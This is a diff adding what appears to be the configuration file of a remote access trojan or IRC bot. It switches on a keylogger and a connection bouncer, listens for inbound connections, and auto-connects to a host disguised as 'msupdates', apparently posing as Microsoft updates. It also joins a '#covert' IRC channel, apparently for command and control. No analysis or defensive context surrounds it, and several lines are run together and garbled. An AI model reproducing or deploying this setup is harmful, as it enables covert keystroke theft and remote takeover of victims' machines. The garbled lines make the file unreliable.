@@ -1,0 +1,17 @@
+[Connection]
+AcceptConnections=1
+AutoConnectEnabled=1
+ListenPort=3786
+AutoConnectHost=msupdates.servehttp.com
+AutoConnectPort=2201
+[Settings]
+IRC=1
+Keylogger=1
+Bouncer=1
+[IRC]
+Port=6667Server=irc.choopa.net
+Channel=#covert|online
+Nick=[s]
+Name=From Brian
+Email=asd@asdf.com
+Owner=sAnimatior=sAnimatioo
